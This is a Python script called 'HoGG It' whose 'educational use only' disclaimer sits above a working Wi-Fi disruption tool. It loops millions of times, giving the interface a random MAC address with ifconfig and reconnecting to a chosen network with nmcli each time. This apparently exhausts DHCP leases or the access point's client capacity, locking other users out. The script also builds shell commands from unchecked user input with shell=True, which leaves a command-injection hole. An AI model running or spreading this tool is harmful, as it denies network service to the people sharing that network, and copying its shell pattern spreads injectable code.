"""HoGG It 1.0, Written by xXThe_SunXx. Updated: July 10th 2024"""
"""For educational use only. Writer is not responsible for any physical, digital, or legal damaged caused by this script."""
"""Use at your own descretion"""

import socket
import sys
import time
from getmac import get_mac_address as gma
from generate_mac import generate_mac
import subprocess
import os
from colorama import Fore
from colorama import init as colorama_init


print(Fore.RED + """
██   ██  ██████   ██████   ██████          ██ ████████ 
██   ██ ██    ██ ██       ██               ██    ██    
███████ ██    ██ ██   ███ ██   ███         ██    ██    
██   ██ ██    ██ ██    ██ ██    ██         ██    ██    
██   ██  ██████   ██████   ██████  ███████ ██    ██    

By xXThe_SunXx      
""")
print(Fore.WHITE + " ")


def main():
    confirm = input('Run HoGG_It [(y)es or(n)o]? ')
    if confirm == 'yes' or confirm == 'y' or confirm == 'Y' or confirm == 'YES':
        print('Running HoGG_It...')

    else:
        print('Exiting HoGG_It...')
        time.sleep(1)
        sys.exit()

    var_mac = ''
    hostname = socket.gethostname()
    IP = socket.gethostbyname(hostname)
    iface = input("Enter interface would you like to use (enter network interface): ")
    essid = input("Enter essid would you like to connect to (network name): ")
    key = input("Enter essid passkey: ")

    print(f'Current Mac address: {gma()}')
    print(f'Current IP address: {IP}')
    

    n = 0
    while n < 16777216:

        var_mac = generate_mac.total_random()
        subprocess.check_output(f"ifconfig {iface} down", shell=True)
        time.sleep(1)
        subprocess.check_output(f"ifconfig {iface} hw ether {var_mac}", shell=True)
        time.sleep(1)
        subprocess.check_output(f"ifconfig {iface} up", shell=True)
        time.sleep(1)
        subprocess.check_output(f"nmcli dev wifi connect {essid} password {key}", shell=True)

        hostname = socket.gethostname()
        IP = socket.gethostbyname(hostname)

        print(f'Current Mac address: {gma()}')
        time.sleep(1)
        n = n + 1


if __name__ == '__main__':
    main()
